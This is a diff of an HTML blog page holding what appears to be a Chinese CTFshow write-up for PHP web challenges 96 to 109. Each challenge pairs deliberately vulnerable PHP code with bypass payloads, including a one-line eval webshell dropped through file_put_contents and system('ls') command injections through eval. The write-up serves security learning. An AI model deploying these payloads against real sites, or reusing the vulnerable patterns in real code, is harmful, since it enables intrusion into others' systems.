+        highlight_file($_GET[&#39;u&#39;]);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>不能直接读取<code>flag.php</code>，</p>
 <p>绝对路径读取：<code>/var/www/html/flag.php</code></p>
 <p>相对路径读取：<code>./flag.php</code></p>
 <p>两者皆可读取flag</p>
-<h1 id="Web-97-md5强比较"><a href="#Web-97-md5强比较" class="headerlink" title="Web-97 md5强比较"></a>Web-97 md5强比较</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-97-md5强比较"><a href="#Web-97-md5强比较" class="headerlink" title="Web-97 md5强比较"></a>Web-97 md5强比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if (isset($_POST['a']) and isset($_POST['b'])) {
-if ($_POST['a'] != $_POST['b'])
-if (md5($_POST['a']) === md5($_POST['b']))
+if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;
+if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])
+if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))
 echo $flag;
 else
-print 'Wrong.';
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+print &#39;Wrong.&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>强比较：如果传入md5函数的不是数值和字符串，而是对象，那么就会返回null，null===null为True，成功绕过</p>
 <p>payload：<code>a[]=1&amp;b[]=2</code></p>
-<h1 id="Web-98-三元运算"><a href="#Web-98-三元运算" class="headerlink" title="Web-98 三元运算"></a>Web-98 三元运算</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
-$_GET?$_GET=&amp;$_POST:'flag';
-$_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag';
-$_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag';
-highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Web-98-三元运算"><a href="#Web-98-三元运算" class="headerlink" title="Web-98 三元运算"></a>Web-98 三元运算</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
+$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;
+$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;
+$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;
+highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
-<p><code>$_GET?$_GET=&amp;$_POST:'flag';</code>和<code>$_GET['HTTP_FLAG']=='flag'</code>是重点只需GET方式随便获取一个值，使POST赋值到GET，以POST方式传输<code>HTTP_FLAG=flag</code>即可</p>
+<p><code>$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;</code>和<code>$_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;</code>是重点只需GET方式随便获取一个值，使POST赋值到GET，以POST方式传输<code>HTTP_FLAG=flag</code>即可</p>
 <p>payload:GET:<code>?a=a</code>,POST:<code>HTTP_FLAG=flag</code></p>
-<h1 id="Web-99-in-array绕过"><a href="#Web-99-in-array绕过" class="headerlink" title="Web-99 in_array绕过"></a>Web-99 in_array绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-$allow = array();
-for ($i=36; $i &lt; 0x36d; $i++) { 
+<h1 id="Web-99-in-array绕过"><a href="#Web-99-in-array绕过" class="headerlink" title="Web-99 in_array绕过"></a>Web-99 in_array绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+$allow &#x3D; array();
+for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123; 
     array_push($allow, rand(1,$i));
-}
-if(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){
-    file_put_contents($_GET['n'], $_POST['content']);
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;
+if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;
+    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p>in_array — 检查数组中是否存在某个值</p>
 <p>语法：</p>
@@ -602,74 +485,74 @@ if(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){
 <p>in_array ( <a href="ms-its://ms-its/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] ) : bool</p>
 </blockquote>
 <p>在<code>$haystack</code>中寻找<code>$needle</code>，如果没有设置<code>$strict</code>，则为弱比较。</p>
-<p>因此，<code>$_GET['n']</code>传入值为<code>1.php</code>时弱等于<code>1</code>.</p>
+<p>因此，<code>$_GET[&#39;n&#39;]</code>传入值为<code>1.php</code>时弱等于<code>1</code>.</p>
 <p>payload:</p>
 <p>GET:<code>?n=1.php</code></p>
 <p>POST:<code>content=&lt;?php eval($_POST[1]);?&gt;</code></p>
 <p>然后打开<code>1.php</code>通过POST执行命令即可</p>
-<h1 id="Web-100-反射类及运算符优先级"><a href="#Web-100-反射类及运算符优先级" class="headerlink" title="Web-100 反射类及运算符优先级"></a>Web-100 反射类及运算符优先级</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-include("ctfshow.php");
-//flag in class ctfshow;
-$ctfshow = new ctfshow();
-$v1=$_GET['v1'];
-$v2=$_GET['v2'];
-$v3=$_GET['v3'];
-$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
-if($v0){
-    if(!preg_match("/\;/", $v2)){
-        if(preg_match("/\;/", $v3)){
-            eval("$v2('ctfshow')$v3");
-        }
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Web-100-反射类及运算符优先级"><a href="#Web-100-反射类及运算符优先级" class="headerlink" title="Web-100 反射类及运算符优先级"></a>Web-100 反射类及运算符优先级</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+include(&quot;ctfshow.php&quot;);
+&#x2F;&#x2F;flag in class ctfshow;
+$ctfshow &#x3D; new ctfshow();
+$v1&#x3D;$_GET[&#39;v1&#39;];
+$v2&#x3D;$_GET[&#39;v2&#39;];
+$v3&#x3D;$_GET[&#39;v3&#39;];
+$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0)&#123;
+    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;
+        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>考察点：and 和 &amp;&amp; 的优先级以及<strong>反射类</strong><code>ReflectionClass</code></p>
 <p>PHP运算符比较：<code>&amp;&amp;</code>&gt;<code>||</code>&gt;<code>=</code>&gt;<code>and</code>&gt;<code>or</code></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">$a=true and false and false;
-var_dump($a);	//返回True
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a&#x3D;true and false and false;
+var_dump($a);	&#x2F;&#x2F;返回True
 
-$a=true &amp;&amp; false &amp;&amp; false;
-var_dump($a);	//返回False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$a&#x3D;true &amp;&amp; false &amp;&amp; false;
+var_dump($a);	&#x2F;&#x2F;返回False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>因此，<code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code>只需v1为数字即可进入if。</p>
 <p>两个判断中，要求<code>$v2</code>不包含;<code>$v3</code>包含;</p>
-<p>根据反射类文档，可构造出<code>echo new ReflectionClass('ctfshow');</code>获取flag</p>
+<p>根据反射类文档，可构造出<code>echo new ReflectionClass(&#39;ctfshow&#39;);</code>获取flag</p>
 <p>构造URL Payload：<code>/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p>
 <p>非预期解payload</p>
-<p><code>v1=1&amp;v2=var_dump('ctfshow')/*&amp;v3=*/;</code></p>
-<p><code>v1=1&amp;v2=?&gt;&lt;?php echo 'ls'?&gt;/*&amp;v3=;*/</code></p>
-<p><code>v1=1&amp;v2=-system('ls')-&amp;v3=-1;</code></p>
-<h1 id="Web-101-反射类"><a href="#Web-101-反射类" class="headerlink" title="Web-101 反射类"></a>Web-101 反射类</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-include("ctfshow.php");
-//flag in class ctfshow;
-$ctfshow = new ctfshow();
-$v1=$_GET['v1'];
-$v2=$_GET['v2'];
-$v3=$_GET['v3'];
-$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
-if($v0){
-    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
-        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
-            eval("$v2('ctfshow')$v3");
-        }
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>v1=1&amp;v2=var_dump(&#39;ctfshow&#39;)/*&amp;v3=*/;</code></p>
+<p><code>v1=1&amp;v2=?&gt;&lt;?php echo &#39;ls&#39;?&gt;/*&amp;v3=;*/</code></p>
+<p><code>v1=1&amp;v2=-system(&#39;ls&#39;)-&amp;v3=-1;</code></p>
+<h1 id="Web-101-反射类"><a href="#Web-101-反射类" class="headerlink" title="Web-101 反射类"></a>Web-101 反射类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+include(&quot;ctfshow.php&quot;);
+&#x2F;&#x2F;flag in class ctfshow;
+$ctfshow &#x3D; new ctfshow();
+$v1&#x3D;$_GET[&#39;v1&#39;];
+$v2&#x3D;$_GET[&#39;v2&#39;];
+$v3&#x3D;$_GET[&#39;v3&#39;];
+$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0)&#123;
+    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;
+        if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>与上一题相同，过滤更严格，直接通过反射类ReflectionClass获取Flag。</p>
-<h1 id="Web-102-103-hex2bin"><a href="#Web-102-103-hex2bin" class="headerlink" title="Web-102,103 hex2bin"></a>Web-102,103 hex2bin</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-$v1 = $_POST['v1'];
-$v2 = $_GET['v2'];
-$v3 = $_GET['v3'];
-$v4 = is_numeric($v2) and is_numeric($v3);
-if($v4){
-    $s = substr($v2,2);
-    $str = call_user_func($v1,$s);
+<h1 id="Web-102-103-hex2bin"><a href="#Web-102-103-hex2bin" class="headerlink" title="Web-102,103 hex2bin"></a>Web-102,103 hex2bin</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+$v1 &#x3D; $_POST[&#39;v1&#39;];
+$v2 &#x3D; $_GET[&#39;v2&#39;];
+$v3 &#x3D; $_GET[&#39;v3&#39;];
+$v4 &#x3D; is_numeric($v2) and is_numeric($v3);
+if($v4)&#123;
+    $s &#x3D; substr($v2,2);
+    $str &#x3D; call_user_func($v1,$s);
     echo $str;
     file_put_contents($v3,$str);
-}
-else{
-    die('hacker');
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;
+else&#123;
+    die(&#39;hacker&#39;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p><strong>本题知识点：</strong>hex2bin(),is_numeric(),call_user_func(),file_put_contents()</p>
 <h2 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h2><p>在PHP5中，hex2bin可将十六进制字符串转换为二进制字符串</p>
@@ -689,16 +572,16 @@ else{
 <p>POST:v1=hex2bin</p>
 </blockquote>
 <p><code>$v2</code>中的e为科学计数法，可以被is_numeric识别，带有其他字符不可以。</p>
-<h1 id="Web-104-sha1弱等于"><a href="#Web-104-sha1弱等于" class="headerlink" title="Web-104 sha1弱等于"></a>Web-104 sha1弱等于</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-include("flag.php");
+<h1 id="Web-104-sha1弱等于"><a href="#Web-104-sha1弱等于" class="headerlink" title="Web-104 sha1弱等于"></a>Web-104 sha1弱等于</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
 
-if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){
-    $v1 = $_POST['v1'];
-    $v2 = $_GET['v2'];
-    if(sha1($v1)==sha1($v2)){
+if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;
         echo $flag;
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>此题没有难度，<code>sha1($v1)</code>弱等于<code>sha1($v2)</code>，也就是说两个值经过sha1加密后传入URL即可。</p>
 <p><code>sha1：计算字符串的sha1散列值，返回sha1散列值字符串。</code></p>
@@ -710,27 +593,27 @@ if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){
 <p>其他解法：</p>
 <p>sha1函数无法处理数组类型，报错返回false</p>
 <p>payload:<code>GET:?v2[]=1</code>and<code>POST:v1[]=2</code></p>
-<h1 id="Web-105-覆盖"><a href="#Web-105-覆盖" class="headerlink" title="Web-105 $$覆盖"></a>Web-105 $$覆盖</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-include('flag.php');
+<h1 id="Web-105-覆盖"><a href="#Web-105-覆盖" class="headerlink" title="Web-105 $$覆盖"></a>Web-105 $$覆盖</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
 error_reporting(0);
-$error='你还想要flag嘛？';
-$suces='既然你想要那给你吧！';
-foreach($_GET as $key =&gt; $value){
-    if($key==='error'){
-        die("what are you doing?!");
-    }
-    $$key=$$value;
-}foreach($_POST as $key =&gt; $value){
-    if($value==='flag'){
-        die("what are you doing?!");
-    }
-    $$key=$$value;
-}
-if(!($_POST['flag']==$flag)){
+$error&#x3D;&#39;你还想要flag嘛？&#39;;
+$suces&#x3D;&#39;既然你想要那给你吧！&#39;;
+foreach($_GET as $key &#x3D;&gt; $value)&#123;
+    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key&#x3D;$$value;
+&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;
+    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key&#x3D;$$value;
+&#125;
+if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;
     die($error);
-}
-echo "your are good".$flag."\n";
-die($suces);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;
+echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
+die($suces);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>本题考察点：变量覆盖</p>
 <p>根据代码中三个<code>if</code>判断，GET中的值不能强等于<code>error</code>,POST中的值不能强等于<code>flag</code>且POST中的值需要弱等于<code>flag</code>否则die。</p>
@@ -744,16 +627,16 @@ die($suces);<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <p>GET:?suces=flag</p>
 <p>POST:error=suces</p>
 </blockquote>
-<h1 id="Web-106-sha1弱比较"><a href="#Web-106-sha1弱比较" class="headerlink" title="Web-106 sha1弱比较"></a>Web-106 sha1弱比较</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
-include("flag.php");
+<h1 id="Web-106-sha1弱比较"><a href="#Web-106-sha1弱比较" class="headerlink" title="Web-106 sha1弱比较"></a>Web-106 sha1弱比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
 
-if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){
-    $v1 = $_POST['v1'];
-    $v2 = $_GET['v2'];
-    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){
+if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;
         echo $flag;
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>与第104题相似，不过多了一个条件，<code>$v1</code>与<code>$v2</code>之间sha1密文可以相同，但字符串不能相同，不能使用104题的方法进行绕过。</p>
 <p>可进行数组绕过：</p>
@@ -765,18 +648,18 @@ if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){
 <blockquote>
 <p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p>
 </blockquote>
-<h1 id="Web-107-md5弱比较"><a href="#Web-107-md5弱比较" class="headerlink" title="Web-107 md5弱比较"></a>Web-107 md5弱比较</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+<h1 id="Web-107-md5弱比较"><a href="#Web-107-md5弱比较" class="headerlink" title="Web-107 md5弱比较"></a>Web-107 md5弱比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
 error_reporting(0);
-include("flag.php");
+include(&quot;flag.php&quot;);
 
-if(isset($_POST['v1'])){
-    $v1 = $_POST['v1'];
-    $v3 = $_GET['v3'];
+if(isset($_POST[&#39;v1&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v3 &#x3D; $_GET[&#39;v3&#39;];
        parse_str($v1,$v2);
-       if($v2['flag']==md5($v3)){
+       if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;
            echo $flag;
-       }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+       &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="parse-str函数"><a href="#parse-str函数" class="headerlink" title="parse_str函数"></a>parse_str函数</h2><p>将字符串解析成多个变量</p>
 <p>语法:</p>
@@ -784,13 +667,13 @@ if(isset($_POST['v1'])){
 <p>parse_str ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>
 </blockquote>
 <p>如果设置了result变量，变量将会以数组的形式存入到这个数组作为替代。</p>
-<p>根据题意，判断为md5的弱比较，需要使<code>$v2['flag']==md5($v3)</code>两边同时为FALSE或TRUE，</p>
+<p>根据题意，判断为md5的弱比较，需要使<code>$v2[&#39;flag&#39;]==md5($v3)</code>两边同时为FALSE或TRUE，</p>
 <p>构造payload：</p>
 <p><code>GET: ?v3[]=1    POST: v1=</code> 满足两边同时为NULL，NULL==NULL为TRUE，因此成立</p>
 <p>or</p>
 <p><code>GET: ?v3=1    POST: v1=flag=c4ca4238a0b923820dcc509a6f75849b</code> v1中的值为md5，两边弱比较为TRUE</p>
 <p>或者使用<code>0e</code>开头的md5，采用00截断的方法绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">0e开头的md5和原值：
+<div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">0e开头的md5和原值：
 QNKCDZO
 0e830400451993494058024219903391
 240610708
@@ -864,38 +747,38 @@ s1836677006a
 s1665632922a
 0e731198061491163073197128363787
 s878926199a
-0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
-<h1 id="Web-108-ereg-00截断"><a href="#Web-108-ereg-00截断" class="headerlink" title="Web-108 ereg %00截断"></a>Web-108 ereg %00截断</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+<h1 id="Web-108-ereg-00截断"><a href="#Web-108-ereg-00截断" class="headerlink" title="Web-108 ereg %00截断"></a>Web-108 ereg %00截断</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
 error_reporting(0);
-include("flag.php");
-if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
-    die('error');
-}
-//只有36d的人才能看到flag
-if(intval(strrev($_GET['c']))==0x36d){
+include(&quot;flag.php&quot;);
+if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;
+    die(&#39;error&#39;);
+&#125;
+&#x2F;&#x2F;只有36d的人才能看到flag
+if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
     echo $flag;
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>正则表达式匹配。如今已被<code>preg_match()</code>函数替代。</p>
 <p><code>ereg()</code>用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。搜索的字符是大小写敏感的。<code>ereg()</code>存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配</p>
 <h2 id="strrev"><a href="#strrev" class="headerlink" title="strrev"></a>strrev</h2><p>反转字符串</p>
 <h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>获取变量的整数值。通过指定的进制<code>base</code>转换(默认十进制)</p>
-<p>已知：通过正则表达式<code>ereg</code>字符串中需要包含字母通过if判断，且将字符串倒转以后<code>$_GET['c']</code>与<code>0x36d</code>弱相等。<code>887</code>为<code>0x36d</code>的10进制</p>
+<p>已知：通过正则表达式<code>ereg</code>字符串中需要包含字母通过if判断，且将字符串倒转以后<code>$_GET[&#39;c&#39;]</code>与<code>0x36d</code>弱相等。<code>887</code>为<code>0x36d</code>的10进制</p>
 <p>综上所述，构造出payload</p>
 <blockquote>
 <p>a%00778</p>
 </blockquote>
 <p>由于<code>ereg</code>的漏洞，正则表达式只会匹配到<code>%00</code>之前的字符，后面的已经被截断，通过验证之后，将payload倒转成<code>877%00a</code>再用intval函数获取整数部分<code>887</code>。</p>
-<h1 id="Web-109-反射类，异常类"><a href="#Web-109-反射类，异常类" class="headerlink" title="Web-109 反射类，异常类"></a>Web-109 反射类，异常类</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+<h1 id="Web-109-反射类，异常类"><a href="#Web-109-反射类，异常类" class="headerlink" title="Web-109 反射类，异常类"></a>Web-109 反射类，异常类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
 error_reporting(0);
-if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){
-    $v1 = $_GET['v1'];
-    $v2 = $_GET['v2'];
-    if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){
-            eval("echo new $v1($v2());");
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_GET[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;
+            eval(&quot;echo new $v1($v2());&quot;);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>考察点：PHP反射类、异常类</p>
 <p>从<code>preg_match</code>正则表达式中可知匹配至少有一个字母的字符串。因此只要new后面有个类不报错就可以随意构造，并且可以直接执行系统命令。</p>
